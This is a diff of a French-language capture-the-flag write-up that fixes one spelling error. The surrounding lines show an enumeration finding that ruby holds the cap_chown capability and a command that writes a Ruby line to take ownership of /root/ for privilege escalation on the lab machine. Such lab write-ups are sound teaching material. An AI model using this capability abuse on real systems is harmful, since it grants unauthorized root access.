@@ -368,7 +368,7 @@ Module 'enumerate' Results
 - /usr/local/bin/ruby -> [cap_chown+ep]
 ```
 
-powcat nous montre que ruby a la capacitée de changer les droits.  
+powcat nous montre que ruby a la capacité de changer les droits.  
 
 ```bash
 (remote) george@empline:/home/george$ echo 'File.chown(1002, nil, "/root/")' > exploit.rb
